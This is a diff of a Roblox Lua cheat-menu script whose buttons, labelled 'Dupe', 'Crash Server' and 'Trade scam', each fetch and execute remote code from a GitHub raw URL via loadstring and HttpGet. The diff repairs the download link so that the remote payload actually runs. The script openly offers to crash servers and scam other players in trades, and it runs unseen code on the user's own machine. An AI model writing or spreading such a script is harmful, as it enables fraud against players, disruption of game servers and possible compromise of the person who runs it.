@@ -7,16 +7,16 @@ local MainSection = Main:NewSection("Main")
 
 
 MainSection:NewButton("Dupe", "start duping process", function()
-    loadstring(game:HttpGet("https://github.com/traptinq001/samkooo/edit/main/saamkoo%20main", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/traptinq001/main1/main/traptinq000", true))()
 end)
 
 
 
 MainSection:NewButton("Crash Server", "use to crash server ", function()
-   loadstring(game:HttpGet("https://github.com/traptinq001/samkooo/edit/main/saamkoo%20main", true))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/traptinq001/main1/main/traptinq000", true))()
 end)
 
 
 MainSection:NewButton("Trade scam", "click this when u puting pets in trade and put it back and click this again booom", function()
-   loadstring(game:HttpGet("https://github.com/traptinq001/samkooo/edit/main/saamkoo%20main", true))()", true))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/traptinq001/main1/main/traptinq000", true))()
 end)
